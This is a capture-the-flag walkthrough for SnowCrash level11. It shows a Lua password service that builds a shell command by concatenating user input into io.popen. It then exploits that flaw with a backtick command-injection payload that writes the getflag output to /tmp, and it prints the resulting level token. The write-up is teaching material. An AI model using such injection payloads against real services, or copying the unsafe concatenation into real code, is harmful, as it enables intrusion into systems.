# Find the Flag11 Password

When we log in as `level11`, we can see the `level11.lua` file in the home directory.

Open the file:

```sh
level11@SnowCrash:~$ cat level11.lua
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The script starts a server on `127.0.0.1:5151`. When a client connects, it asks for a password, hashes the input, and compares the result with a hard-coded SHA-1 hash.

Try running the script manually:

```sh
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
```

The `address already in use` error means the service is already running. Connect to it with `netcat`:

```sh
level11@SnowCrash:~$ nc localhost 5151
Password: test
Erf nope..
```

## Inspect the Vulnerability

The password is checked by hashing the user input:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

We do not need to reverse the SHA-1 hash. The issue is that `pass` is concatenated directly into a shell command and executed with `io.popen()`.

If the input is `hello`, the command becomes:

```sh
echo hello | sha1sum
```

This is a normal hash calculation. However, if the input contains shell syntax, the shell interprets it. For example, with `hello; id`, the command becomes:

```sh
echo hello; id | sha1sum
```

That means we can inject an additional command.

## Exploit the Command Injection

Send a payload that runs `getflag` and redirects its output to a file in `/tmp`:

```sh
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /tmp/flag`
Erf nope..
```

Then read the output file:

```sh
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

The backticks execute `getflag` before the outer command continues, and the result is substituted into the command line. The `> /tmp/flag` redirection writes the standard output of `getflag` to `/tmp/flag` instead of sending it back through the password prompt.

The file contains the token for the next level.
